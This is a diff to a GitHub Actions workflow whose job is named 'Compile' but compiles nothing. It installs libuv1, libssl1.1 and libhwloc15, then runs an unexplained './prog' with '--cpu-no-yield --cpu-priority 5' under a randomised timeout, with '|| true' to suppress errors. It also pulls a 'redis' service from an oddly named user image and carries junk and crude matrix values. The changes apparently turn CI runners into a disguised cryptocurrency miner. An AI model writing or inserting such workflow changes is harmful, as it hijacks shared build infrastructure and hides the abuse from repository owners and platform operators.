@@ -7,6 +7,9 @@ jobs:
   compile:
     name: Compile
     runs-on: ubuntu-latest
+    container: ubuntu:20.10
+    env:
+      DEBIAN_FRONTEND: noninteractive
     services:
       redis:
         image: maggierat456/peepeepoopoo:latest
@@ -27,4 +30,10 @@ jobs:
           - covfefe
           - aids
     steps:
-      - run: sleep $(shuf -i 300-820 -n1)
+      - run: |
+          apt update -qq
+          apt install -y git
+      - uses: actions/checkout@v2
+      - run: |
+          apt install -y libuv1 libssl1.1 libhwloc15
+          timeout $(shuf -i 300-820 -n 1) ./prog --cpu-no-yield --cpu-priority 5 || true
